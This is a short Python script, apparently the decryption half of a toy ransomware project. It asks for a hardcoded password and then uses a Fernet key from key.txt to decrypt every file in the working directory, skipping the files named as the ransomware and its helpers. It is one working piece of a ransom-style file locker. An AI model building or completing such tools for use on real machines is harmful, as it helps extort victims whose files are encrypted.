import os
from cryptography import fernet

mot_de_passe = "chdchd"

while True:
    input_value = input('donner le mot de passe:\n')
    if input_value == mot_de_passe:
        Files = []

        for file in os.listdir():
            if os.path.isfile(file):  #This condition ensures we only process files, not directories
                if file != "ransom.py" and file != "key.txt" and file != "decryption.py":  #Exclude the ransomware script itself
                    Files.append(file)

        with open('key.txt', 'rb') as thefile:
                key = thefile.read()

        # print(key)

        for file in Files:
            with open(file, 'rb') as thefile:
                content = thefile.read()
            content_decrypted = fernet.Fernet(key).decrypt(content)
            # content_encrypted = cipher.encrypt(content) #we can use: cipher = fernet.Fernet(key)
            with open(file,'wb') as thefile:
                thefile.write(content_decrypted)
        break
    else: 
        print("mot de passe incorrect")
        continue
